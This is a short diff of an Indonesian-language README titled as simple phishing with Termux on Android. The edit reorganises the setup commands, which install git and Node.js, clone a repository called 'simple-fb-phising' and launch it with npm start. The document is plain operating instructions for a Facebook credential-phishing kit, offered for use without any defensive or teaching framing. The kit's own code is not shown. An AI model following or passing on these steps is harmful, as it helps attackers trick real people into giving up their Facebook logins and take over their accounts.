@@ -2,16 +2,13 @@
 
 ## Phising sederhana menggunakan Termux di Android
 
-Buka Termux dan update package
-```bash
-pkg update && pkg upgrade
-```
-
    ```bash
+   pkg update && pkg upgrade
+   pkg install git
    git clone https://github.com/sandhemongss/simple-fb-phising.git
    
    cd simple-fb-phising
-   
+   pkg install nodejs
    npm start
    
    ```
